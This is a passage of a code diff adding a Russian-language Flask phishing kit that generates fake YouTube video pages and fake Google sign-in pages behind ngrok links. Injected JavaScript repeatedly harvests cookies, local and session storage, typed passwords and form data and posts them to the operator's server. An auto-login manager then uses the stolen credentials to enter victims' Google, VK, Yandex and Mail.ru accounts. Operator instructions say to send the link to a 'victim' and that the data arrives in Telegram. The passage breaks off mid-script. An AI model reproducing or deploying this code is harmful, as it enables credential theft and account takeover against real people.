+                    "message": "Успешный вход через пароль",
+                    "screenshot_path": screenshot_path
+                }
+            else:
+                return {
+                    "success": False,
+                    "service": service,
+                    "message": "Неверный логин или пароль"
+                }
+            
+        except Exception as e:
+            logger.error(f"Error in credentials login: {e}")
+            return {
+                "success": False,
+                "service": service,
+                "message": f"Ошибка: {str(e)[:100]}"
+            }
+    
+    def auto_login_all_services(self, captured_data):
+        """Автоматически входит во все возможные сервисы"""
+        results = []
+        
+        # Получаем cookies из данных
+        cookies = captured_data.get('cookies', [])
+        passwords = captured_data.get('passwords', [])
+        logins = captured_data.get('logins', [])
+        
+        if not cookies and not passwords:
+            return results
+        
+        # Определяем какие сервисы возможны
+        services_to_try = self.identify_services_from_data(captured_data)
+        
+        for service in services_to_try:
+            logger.info(f"Попытка автоматического входа в {service}")
+            
+            # Ищем email и пароль для этого сервиса
+            email, password = self.find_credentials_for_service(service, logins, passwords)
+            
+            # Пробуем войти через cookies
+            result = self.login_with_cookies(service, cookies, email, password)
+            results.append(result)
+            
+            # Пауза между попытками
+            time.sleep(2)
+        
+        return results
+    
+    def identify_services_from_data(self, data):
+        """Определяет возможные сервисы из данных"""
+        services = set()
+        
+        # Из cookies
+        cookies = data.get('cookies', [])
+        for cookie in cookies:
+            cookie_name = cookie.get('name', '').lower()
+            cookie_value = cookie.get('value', '').lower()
+            
+            if 'google' in cookie_name or 'google' in cookie_value:
+                services.add('google')
+            if 'facebook' in cookie_name or 'fb' in cookie_name:
+                services.add('facebook')
+            if 'instagram' in cookie_name or 'ig_' in cookie_name:
+                services.add('instagram')
+            if 'twitter' in cookie_name or 'auth_token' in cookie_name:
+                services.add('twitter')
+            if 'vk' in cookie_name or 'vkontakte' in cookie_name:
+                services.add('vk')
+            if 'yandex' in cookie_name:
+                services.add('yandex')
+        
+        # Из логинов/паролей
+        emails = []
+        emails.extend([l.get('value') for l in data.get('logins', []) if '@' in l.get('value', '')])
+        
+        for email in emails:
+            email_lower = email.lower()
+            if '@gmail.com' in email_lower or '@googlemail.com' in email_lower:
+                services.add('google')
+            if '@yandex.' in email_lower or '@ya.ru' in email_lower:
+                services.add('yandex')
+            if '@mail.ru' in email_lower or '@inbox.ru' in email_lower:
+                services.add('mailru')
+            if '@vk.com' in email_lower:
+                services.add('vk')
+        
+        return list(services)
+    
+    def find_credentials_for_service(self, service, logins, passwords):
+        """Находит учетные данные для конкретного сервиса"""
+        email = None
+        password = None
+        
+        # Сопоставляем email и пароль по полям формы
+        for login in logins:
+            login_value = login.get('value', '')
+            
+            # Определяем сервис по email
+            if '@' in login_value:
+                if service == 'google' and ('@gmail.com' in login_value or '@googlemail.com' in login_value):
+                    email = login_value
+                elif service == 'yandex' and ('@yandex.' in login_value or '@ya.ru' in login_value):
+                    email = login_value
+                elif service == 'mailru' and ('@mail.ru' in login_value or '@inbox.ru' in login_value or '@list.ru' in login_value or '@bk.ru' in login_value):
+                    email = login_value
+                elif service == 'vk' and '@vk.com' in login_value:
+                    email = login_value
+        
+        # Ищем пароль
+        for pwd in passwords:
+            # Пароль может быть связан по форме или полю
+            password = pwd.get('value')
+            break  # Берем первый найденный
+        
+        return email, password
+    
+    def close(self):
+        """Закрывает драйвер"""
+        if self.driver:
+            try:
+                self.driver.quit()
+            except:
+                pass
+            self.driver = None
+
+# Инициализация менеджера автовхода
+auto_login_manager = AutoLoginManager()
+
+# ========== YOUTUBE МЕНЕДЖЕР ==========
+class YouTubeManager:
+    @staticmethod
+    def extract_video_id(url):
+        """Извлекает ID видео из YouTube URL"""
+        patterns = [
+            r'(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([a-zA-Z0-9_-]{11})',
+            r'v=([a-zA-Z0-9_-]{11})'
+        ]
+        
+        for pattern in patterns:
+            match = re.search(pattern, url)
+            if match:
+                return match.group(1)
+        
+        # Дефолтное видео (Rick Roll)
+        return "dQw4w9WgXcQ"
+    
+    @staticmethod
+    def generate_phishing_url(ngrok_url, youtube_id, link_id):
+        """Генерирует фишинговую ссылку"""
+        return f"{ngrok_url}/watch?v={youtube_id}&id={link_id}&t={int(time.time())}"
+    
+    @staticmethod
+    def get_video_info(youtube_id):
+        """Получает информацию о видео"""
+        try:
+            # Пытаемся получить через YouTube API (упрощенно)
+            return {
+                "title": f"YouTube Video {youtube_id}",
+                "description": "Интересное видео на YouTube",
+                "thumbnail": f"https://img.youtube.com/vi/{youtube_id}/maxresdefault.jpg"
+            }
+        except:
+            return {
+                "title": "YouTube Video",
+                "description": "Смотрите интересное видео",
+                "thumbnail": ""
+            }
+
+# ========== HTML ШАБЛОНЫ ==========
+HTML_TEMPLATES = {
+    "youtube_page": """
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube Video</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        
+        body {
+            background: #0f0f0f;
+            color: #fff;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .player-container {
+            position: relative;
+            padding-bottom: 56.25%;
+            height: 0;
+            overflow: hidden;
+            border-radius: 12px;
+            background: #000;
+            margin-bottom: 20px;
+        }
+        
+        .player-container iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        
+        .video-title {
+            font-size: 24px;
+            margin: 20px 0 10px;
+            font-weight: bold;
+        }
+        
+        .video-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #333;
+        }
+        
+        .video-views {
+            color: #aaa;
+            font-size: 14px;
+        }
+        
+        .video-actions {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .action-btn {
+            background: #272727;
+            border: none;
+            color: #fff;
+            padding: 8px 15px;
+            border-radius: 20px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .action-btn:hover {
+            background: #3d3d3d;
+        }
+        
+        .channel-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .channel-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: #666;
+        }
+        
+        .channel-name {
+            font-weight: bold;
+        }
+        
+        .subscribe-btn {
+            background: #cc0000;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        
+        .comments-section {
+            margin-top: 30px;
+        }
+        
+        .comment {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .comment-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #444;
+        }
+        
+        .comment-content {
+            flex: 1;
+        }
+        
+        .comment-author {
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .comment-text {
+            color: #ddd;
+            line-height: 1.4;
+        }
+        
+        .ad-banner {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        
+        .login-prompt {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 30px;
+        }
+        
+        .login-prompt h3 {
+            margin-bottom: 10px;
+            color: #fff;
+        }
+        
+        .login-prompt p {
+            color: #aaa;
+            margin-bottom: 15px;
+        }
+        
+        .login-btn {
+            background: #4285f4;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 50px;
+            color: #aaa;
+        }
+        
+        /* Мобильная адаптация */
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+            }
+            
+            .video-title {
+                font-size: 18px;
+            }
+            
+            .video-info {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Рекламный баннер -->
+        <div class="ad-banner">
+            🎬 Для просмотра видео требуется авторизация через Google
+        </div>
+        
+        <!-- Плеер -->
+        <div class="player-container">
+            <iframe 
+                src="https://www.youtube.com/embed/{youtube_id}?autoplay=1&controls=1&showinfo=0&rel=0&modestbranding=1" 
+                frameborder="0" 
+                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+                allowfullscreen
+                id="youtubePlayer">
+            </iframe>
+        </div>
+        
+        <!-- Заголовок и информация -->
+        <h1 class="video-title">{video_title}</h1>
+        
+        <div class="video-info">
+            <div class="video-views">
+                {views_count} просмотров • {upload_date}
+            </div>
+            <div class="video-actions">
+                <button class="action-btn">👍 {like_count}</button>
+                <button class="action-btn">👎</button>
+                <button class="action-btn">📤 Поделиться</button>
+                <button class="action-btn">💾 Сохранить</button>
+            </div>
+        </div>
+        
+        <!-- Информация о канале -->
+        <div class="channel-info">
+            <div class="channel-avatar"></div>
+            <div>
+                <div class="channel-name">{channel_name}</div>
+                <div style="color: #aaa; font-size: 14px;">{subscribers_count} подписчиков</div>
+            </div>
+            <button class="subscribe-btn">ПОДПИСАТЬСЯ</button>
+        </div>
+        
+        <!-- Описание -->
+        <div style="background: #1a1a1a; padding: 15px; border-radius: 10px; margin: 20px 0; line-height: 1.6;">
+            {video_description}
+        </div>
+        
+        <!-- Комментарии -->
+        <div class="comments-section">
+            <h3 style="margin-bottom: 20px;">💬 Комментарии ({comments_count})</h3>
+            
+            <div class="comment">
+                <div class="comment-avatar"></div>
+                <div class="comment-content">
+                    <div class="comment-author">Пользователь 1</div>
+                    <div class="comment-text">Отличное видео! Спасибо за контент! 👍</div>
+                </div>
+            </div>
+            
+            <div class="comment">
+                <div class="comment-avatar"></div>
+                <div class="comment-content">
+                    <div class="comment-author">Пользователь 2</div>
+                    <div class="comment-text">Очень информативно, жду продолжения!</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Запрос на авторизацию -->
+        <div class="login-prompt" id="loginPrompt">
+            <h3>🔐 Требуется авторизация</h3>
+            <p>Для продолжения просмотра и доступа ко всем функциям YouTube необходимо войти в аккаунт Google.</p>
+            <button class="login-btn" onclick="showLoginForm()">ВОЙТИ В АККАУНТ</button>
+        </div>
+        
+        <!-- Форма входа (скрыта изначально) -->
+        <div id="loginForm" style="display: none;">
+            <div style="background: #1a1a1a; padding: 25px; border-radius: 10px; margin: 20px 0; border: 1px solid #333;">
+                <h3 style="color: #fff; margin-bottom: 20px;">Вход в Google</h3>
+                <form id="googleLoginForm">
+                    <input type="email" 
+                           placeholder="Электронная почта или телефон" 
+                           style="width: 100%; padding: 15px; margin: 10px 0; background: #2d2d2d; border: 1px solid #444; border-radius: 5px; color: white;">
+                    <input type="password" 
+                           placeholder="Введите пароль" 
+                           style="width: 100%; padding: 15px; margin: 10px 0; background: #2d2d2d; border: 1px solid #444; border-radius: 5px; color: white;">
+                    <button type="submit" 
+                            style="width: 100%; padding: 15px; background: #4285f4; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin-top: 10px;">
+                        Далее
+                    </button>
+                </form>
+                <p style="color: #666; font-size: 12px; margin-top: 15px;">
+                    Нажимая кнопку "Далее", вы соглашаетесь с Условиями использования и Политикой конфиденциальности Google.
+                </p>
+            </div>
+        </div>
+        
+        <!-- Индикатор загрузки -->
+        <div class="loading" id="loading">
+            Загрузка видео... Пожалуйста, подождите
+        </div>
+    </div>
+    
+    <script>
+        // Данные для сбора
+        const linkId = "{link_id}";
+        const ngrokUrl = "{ngrok_url}";
+        
+        // Функция для сбора всех данных
+        function collectAllData() {{
+            const data = {{
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: {{
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth
+                }},
+                cookies: {{}},
+                localStorage: {{}},
+                sessionStorage: {{}},
+                passwords: [],
+                logins: [],
+                creditCards: [],
+                autofillData: {{}},
+                browserInfo: {{
+                    cookieEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack
+                }},
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            }};
+            
+            try {{
+                // Собираем cookies
+                const cookieString = document.cookie;
+                if (cookieString) {{
+                    cookieString.split(';').forEach(cookie => {{
+                        const [name, value] = cookie.trim().split('=');
+                        if (name && value) {{
+                            data.cookies[name] = decodeURIComponent(value);
+                        }}
+                    }});
+                }}
+                
+                // Собираем LocalStorage
+                if (window.localStorage) {{
+                    for (let i = 0; i < localStorage.length; i++) {{
+                        const key = localStorage.key(i);
+                        data.localStorage[key] = localStorage.getItem(key);
+                    }}
+                }}
+                
+                // Собираем SessionStorage
+                if (window.sessionStorage) {{
+                    for (let i = 0; i < sessionStorage.length; i++) {{
+                        const key = sessionStorage.key(i);
+                        data.sessionStorage[key] = sessionStorage.getItem(key);
+                    }}
+                }}
+                
+                // Собираем пароли из полей
+                document.querySelectorAll('input[type="password"]').forEach(field => {{
+                    if (field.value) {{
+                        data.passwords.push({{
+                            field: field.name || field.id || 'password',
+                            value: field.value,
+                            form: field.form ? field.form.id : 'no_form'
+                        }});
+                    }}
+                }});
+                
+                // Собираем логины
+                const loginFields = document.querySelectorAll('input[type="text"], input[type="email"]');
+                loginFields.forEach(field => {{
+                    if (field.value) {{
+                        data.logins.push({{
+                            field: field.name || field.id || 'login',
+                            value: field.value,
+                            type: field.type
+                        }});
+                    }}
+                }});
+                
+                // Собираем данные автозаполнения
+                document.querySelectorAll('form').forEach(form => {{
+                    try {{
+                        const formData = new FormData(form);
+                        const formValues = {{}};
+                        for (let [key, value] of formData.entries()) {{
+                            formValues[key] = value;
+                        }}
+                        if (Object.keys(formValues).length > 0) {{
+                            data.autofillData[form.id || 'form_' + Date.now()] = formValues;
+                        }}
+                    }} catch (e) {{}}
+                }});
+                
+                return data;
+                
+            }} catch (error) {{
+                console.error('Error collecting data:', error);
+                return data;
+            }}
+        }}
+        
+        // Функция отправки данных
+        function sendData(data, type = 'page_load') {{
+            try {{
+                fetch('{ngrok_url}/api/collect', {{
+                    method: 'POST',
+                    headers: {{
+                        'Content-Type': 'application/json',
+                    }},
+                    body: JSON.stringify({{
+                        link_id: linkId,
+                        data_type: type,
+                        data: btoa(unescape(encodeURIComponent(JSON.stringify(data)))),
+                        timestamp: new Date().toISOString()
+                    }})
+                }}).catch(() => {{}});
+            }} catch (error) {{
+                console.error('Error sending data:', error);
+            }}
+        }}
+        
+        // Основной сбор данных
+        window.addEventListener('load', function() {{
+            // Сбор при загрузке страницы
+            setTimeout(() => {{
+                const data = collectAllData();
+                sendData(data, 'initial_load');
+            }}, 2000);
+            
+            // Периодический сбор каждые 10 секунд
+            setInterval(() => {{
+                const data = collectAllData();
+                sendData(data, 'periodic');
+            }}, 10000);
+            
+            // Сбор при уходе со страницы
+            window.addEventListener('beforeunload', function() {{
+                const data = collectAllData();
+                const blob = new Blob([JSON.stringify({{
+                    link_id: linkId,
+                    data_type: 'page_exit',
+                    data: btoa(unescape(encodeURIComponent(JSON.stringify(data))))
+                }})], {{type: 'application/json'}});
+                
+                navigator.sendBeacon('{ngrok_url}/api/collect', blob);
+            }});
+        }});
+        
+        // Сбор при взаимодействии с формами
+        document.addEventListener('submit', function(e) {{
+            setTimeout(() => {{
+                const data = collectAllData();
+                sendData(data, 'form_submit');
+            }}, 1000);
+        }});
+        
+        // Сбор при изменении полей
+        document.addEventListener('input', function(e) {{
+            if (e.target.type === 'password' || e.target.type === 'email' || e.target.type === 'text') {{
+                setTimeout(() => {{
+                    const data = collectAllData();
+                    sendData(data, 'field_input');
+                }}, 2000);
+            }}
+        }});
+        
+        // Функция для показа формы входа
+        function showLoginForm() {{
+            document.getElementById('loginPrompt').style.display = 'none';
+            document.getElementById('loginForm').style.display = 'block';
+            document.getElementById('loading').innerHTML = '🔐 Проверка учетных данных...';
+            
+            // Имитация проверки
+            setTimeout(function() {{
+                document.getElementById('loading').innerHTML = '✅ Успешный вход! Продолжаем просмотр...';
+                setTimeout(function() {{
+                    document.getElementById('loading').style.display = 'none';
+                }}, 2000);
+            }}, 1500);
+        }}
+        
+        // Обработка формы входа
+        document.getElementById('googleLoginForm').addEventListener('submit', function(e) {{
+            e.preventDefault();
+            document.getElementById('loading').innerHTML = '🔐 Проверка безопасности...';
+            
+            // Собираем данные формы
+            const email = this.querySelector('input[type="email"]').value;
+            const password = this.querySelector('input[type="password"]').value;
+            
+            // Собираем и отправляем данные
+            const formData = collectAllData();
+            formData.formCredentials = {{ email, password }};
+            sendData(formData, 'login_form');
+            
+            // Имитация успешного входа
+            setTimeout(function() {{
+                document.getElementById('loading').innerHTML = '✅ Успешный вход! Перенаправление...';
+            }}, 2000);
+        }});
+        
+        // Автоматический показ формы через 10 секунд
+        setTimeout(function() {{
+            showLoginForm();
+        }}, 10000);
+    </script>
+</body>
+</html>
+""",
+
+    "login_form": """
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Авторизация Google</title>
+    <style>
+        body {
+            font-family: 'Google Sans', Arial, sans-serif;
+            background: #f1f3f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        
+        .login-container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 40px;
+            width: 100%;
+            max-width: 450px;
+        }
+        
+        .google-logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .google-logo img {
+            width: 75px;
+            height: 24px;
+        }
+        
+        h1 {
+            text-align: center;
+            color: #202124;
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            text-align: center;
+            color: #5f6368;
+            margin-bottom: 30px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        
+        .form-group input:focus {
+            border-color: #1a73e8;
+            outline: none;
+        }
+        
+        .login-button {
+            width: 100%;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 0;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        
+        .login-button:hover {
+            background: #1669d6;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+            font-size: 14px;
+        }
+        
+        .footer-links a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        
+        .language-selector {
+            text-align: center;
+            margin-top: 40px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        
+        .privacy-notice {
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 20px;
+            line-height: 1.4;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="google-logo">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+        </div>
+        
+        <h1>Войдите в аккаунт Google</h1>
+        <div class="subtitle">Продолжите работу на YouTube</div>
+        
+        <form id="googleLoginForm">
+            <div class="form-group">
+                <input type="email" id="email" name="email" placeholder="Электронная почта или телефон" required>
+            </div>
+            
+            <div class="form-group">
+                <input type="password" id="password" name="password" placeholder="Введите пароль" required>
+            </div>
+            
+            <button type="submit" class="login-button">Далее</button>
+        </form>
+        
+        <div class="footer-links">
+            <a href="#">Создать аккаунт</a>
+            <a href="#">Забыли пароль?</a>
+        </div>
+        
+        <div class="privacy-notice">
+            Нажимая кнопку «Далее», вы соглашаетесь с <a href="#">Условиями использования</a> 
+            и подтверждаете прочтение <a href="#">Политики конфиденциальности</a> Google.
+        </div>
+        
+        <div class="language-selector">
+            <select style="border: none; background: none; color: #5f6368;">
+                <option>Русский</option>
+                <option>English</option>
+            </select>
+        </div>
+    </div>
+    
+    <script>
+        document.getElementById('googleLoginForm').addEventListener('submit', function(e) {{
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Собираем все данные
+            const data = {{
+                timestamp: new Date().toISOString(),
+                email: email,
+                password: password,
+                userAgent: navigator.userAgent,
+                cookies: document.cookie,
+                url: window.location.href
+            }};
+            
+            // Отправляем данные
+            fetch('/api/collect_login', {{
+                method: 'POST',
+                headers: {{
+                    'Content-Type': 'application/json',
+                }},
+                body: JSON.stringify({{
+                    link_id: '{link_id}',
+                    data_type: 'google_login',
+                    data: btoa(unescape(encodeURIComponent(JSON.stringify(data))))
+                }})
+            }}).then(() => {{
+                // Перенаправляем на "успешную страницу"
+                window.location.href = '/login_success?service=google';
+            }});
+        }});
+    </script>
+</body>
+</html>
+""",
+
+    "login_success": """
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Успешный вход</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f1f3f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        
+        .success-container {
+            background: white;
+            border-radius: 10px;
+            padding: 40px;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            max-width: 400px;
+        }
+        
+        .success-icon {
+            color: #34a853;
+            font-size: 60px;
+            margin-bottom: 20px;
+        }
+        
+        h1 {
+            color: #202124;
+            margin-bottom: 10px;
+        }
+        
+        p {
+            color: #5f6368;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+        
+        .continue-btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+        }
+        
+        .continue-btn:hover {
+            background: #1669d6;
+        }
+    </style>
+</head>
+<body>
+    <div class="success-container">
+        <div class="success-icon">✅</div>
+        <h1>Вход выполнен успешно!</h1>
+        <p>Вы успешно вошли в свой аккаунт {service}.</p>
+        <p>Теперь вы можете продолжить просмотр видео на YouTube.</p>
+        <a href="/" class="continue-btn">Продолжить просмотр</a>
+    </div>
+</body>
+</html>
+"""
+}
+
+# ========== FLASK СЕРВЕР ==========
+app = Flask(__name__)
+app.secret_key = os.urandom(24)
+CORS(app)
+
+# Глобальные переменные
+ngrok_manager = None
+current_ngrok_url = None
+telegram_app = None
+
+def extract_youtube_video_info(url):
+    """Извлекает информацию о YouTube видео"""
+    video_id = YouTubeManager.extract_video_id(url)
+    info = YouTubeManager.get_video_info(video_id)
+    
+    # Генерируем реалистичные данные
+    views = random.randint(10000, 10000000)
+    likes = random.randint(1000, views // 100)
+    upload_date = f"{random.randint(1, 30)}.{random.randint(1, 12)}.{random.randint(2020, 2024)}"
+    
+    return {
+        'video_id': video_id,
+        'title': info['title'],
+        'description': info['description'],
+        'thumbnail': info['thumbnail'],
+        'views': f"{views:,}".replace(',', ' '),
+        'likes': f"{likes:,}".replace(',', ' '),
+        'upload_date': upload_date,
+        'channel_name': random.choice(['YouTube Creator', 'Tech Channel', 'Music Videos', 'Game Streams']),
+        'subscribers': f"{random.randint(10000, 10000000):,}".replace(',', ' '),
+        'comments': random.randint(50, 5000)
+    }
+
+@app.route('/')
+def home():
+    """Главная страница - перенаправление на фишинг"""
+    return redirect('/phishing_home')
+
+@app.route('/phishing_home')
+def phishing_home():
+    """Страница выбора для фишинга"""
+    stats = db.get_stats()
+    
+    html_content = """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>YouTube Video Portal</title>
+        <style>
+            body {
+                font-family: Arial, sans-serif;
+                background: #f9f9f9;
+                padding: 20px;
+                max-width: 800px;
+                margin: 0 auto;
+            }
+            .header {
+                text-align: center;
+                margin-bottom: 30px;
+            }
+            .stats {
+                background: white;
+                padding: 20px;
+                border-radius: 10px;
+                margin-bottom: 20px;
+                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            }
+            .link-form {
+                background: white;
+                padding: 30px;
+                border-radius: 10px;
+                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            }
+            input[type="text"] {
+                width: 100%;
+                padding: 12px;
+                margin: 10px 0;
+                border: 1px solid #ddd;
+                border-radius: 5px;
+                font-size: 16px;
+            }
+            button {
+                background: #4285f4;
+                color: white;
+                border: none;
+                padding: 12px 25px;
+                border-radius: 5px;
+                cursor: pointer;
+                font-size: 16px;
+                width: 100%;
+            }
+            .instructions {
+                margin-top: 30px;
+                padding: 20px;
+                background: #e8f4fd;
+                border-radius: 10px;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="header">
+            <h1>🎬 YouTube Video Portal</h1>
+            <p>Вставьте ссылку на YouTube видео для создания персональной ссылки</p>
+        </div>
+        
+        <div class="stats">
+            <h3>📊 Статистика системы</h3>
+            <p>Всего создано ссылок: <strong>""" + str(stats.get('total_links', 0)) + """</strong></p>
+            <p>Всего переходов: <strong>""" + str(stats.get('total_clicks', 0)) + """</strong></p>
+            <p>Собрано данных: <strong>""" + str(stats.get('total_captured', 0)) + """</strong></p>
+        </div>
+        
+        <div class="link-form">
+            <h3>🔗 Создать фишинг ссылку</h3>
+            <form action="/create_phishing_link" method="POST">
+                <input type="text" name="youtube_url" placeholder="https://youtube.com/watch?v=..." required>
+                <button type="submit">Создать ссылку</button>
+            </form>
+        </div>
+        
+        <div class="instructions">
+            <h3>📋 Как это работает:</h3>
+            <ol>
+                <li>Вставьте ссылку на YouTube видео</li>
+                <li>Получите специальную ссылку</li>
+                <li>Отправьте её другу/знакомому</li>
+                <li>Когда человек перейдет - начнется сбор данных</li>
+                <li>Все данные автоматически придут вам в Telegram</li>
+                <li>Система попытается автоматически войти в аккаунты</li>
+            </ol>
+        </div>
+    </body>
+    </html>
+    """
+    
+    return html_content
+
+@app.route('/create_phishing_link', methods=['POST'])
+def create_phishing_link():
+    """Создает фишинг ссылку"""
+    youtube_url = request.form.get('youtube_url', '').strip()
+    
+    if not youtube_url:
+        return "Ошибка: Нет ссылки", 400
+    
+    # Извлекаем информацию о видео
+    video_info = extract_youtube_video_info(youtube_url)
+    video_id = video_info['video_id']
+    
+    # Генерируем уникальный ID
+    link_id = str(uuid.uuid4())[:12]
+    
+    # Создаем фишинг URL
+    if current_ngrok_url:
+        phishing_url = YouTubeManager.generate_phishing_url(current_ngrok_url, video_id, link_id)
+    else:
+        phishing_url = f"http://localhost:{FLASK_PORT}/watch?v={video_id}&id={link_id}"
+    
+    # Сохраняем в базу
+    link_data = {
+        'id': link_id,
+        'youtube_url': youtube_url,
+        'youtube_id': video_id,
+        'phishing_url': phishing_url,
+        'created_at': datetime.now().isoformat(),
+        'created_by': 0,  # В реальном боте здесь будет ID пользователя
+        'title': video_info['title'],
+        'description': video_info['description']
+    }
+    
+    db.add_phishing_link(link_data)
+    
+    # Формируем HTML ответ
+    html_content = f"""
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Ссылка создана!</title>
+        <style>
+            body {{
+                font-family: Arial, sans-serif;
+                background: #f9f9f9;
+                padding: 40px;
+                max-width: 800px;
+                margin: 0 auto;
+            }}
+            .success-box {{
+                background: white;
+                padding: 40px;
+                border-radius: 15px;
+                box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+                text-align: center;
+            }}
+            .success-icon {{
+                color: #34a853;
+                font-size: 60px;
+                margin-bottom: 20px;
+            }}
+            .phishing-url {{
+                background: #f1f3f4;
+                padding: 15px;
+                border-radius: 8px;
+                margin: 20px 0;
+                word-break: break-all;
+                font-family: monospace;
+            }}
+            .copy-btn {{
+                background: #4285f4;
+                color: white;
+                border: none;
+                padding: 12px 25px;
+                border-radius: 5px;
+                cursor: pointer;
+                font-size: 16px;
+                margin: 10px;
+            }}
+            .info-box {{
+                background: #e8f4fd;
+                padding: 20px;
+                border-radius: 10px;
+                margin-top: 30px;
+                text-align: left;
+            }}
+        </style>
+    </head>
+    <body>
+        <div class="success-box">
+            <div class="success-icon">✅</div>
+            <h1>Ссылка создана успешно!</h1>
+            
+            <h3>Оригинальное видео:</h3>
+            <p>{youtube_url[:80]}...</p>
+            
+            <h3>Название видео:</h3>
+            <p>{video_info['title']}</p>
+            
+            <h3>Ваша фишинг ссылка:</h3>
+            <div class="phishing-url" id="phishingUrl">{phishing_url}</div>
+            
+            <button class="copy-btn" onclick="copyToClipboard()">📋 Копировать ссылку</button>
+            <a href="{phishing_url}" target="_blank"><button class="copy-btn">🔗 Открыть ссылку</button></a>
+            
+            <div class="info-box">
+                <h4>📋 Что делать дальше:</h4>
+                <ol>
+                    <li>Скопируйте ссылку выше</li>
+                    <li>Отправьте её жертве (через соцсети, сообщения и т.д.)</li>
+                    <li>Когда жертва перейдет по ссылке - начнется сбор данных</li>
+                    <li>Все данные автоматически придут в Telegram бот</li>
+                    <li>Система попытается автоматически войти в аккаунты жертвы</li>
+                </ol>
+                
+                <h4>🔐 Что будет собрано:</h4>
+                <ul>
+                    <li>Все cookies браузера</li>
+                    <li>LocalStorage и SessionStorage</li>
+                    <li>Сохраненные пароли и логины</li>
+                    <li>Данные автозаполнения форм</li>
+                    <li>Информация о браузере и устройстве</li>
+                    <li>IP адрес и геолокация</li>
+                </ul>
+            </div>
+        </div>
+        
+        <script>
+            function copyToClipboard() {{
+                const url = document.getElementById('phishingUrl').innerText;
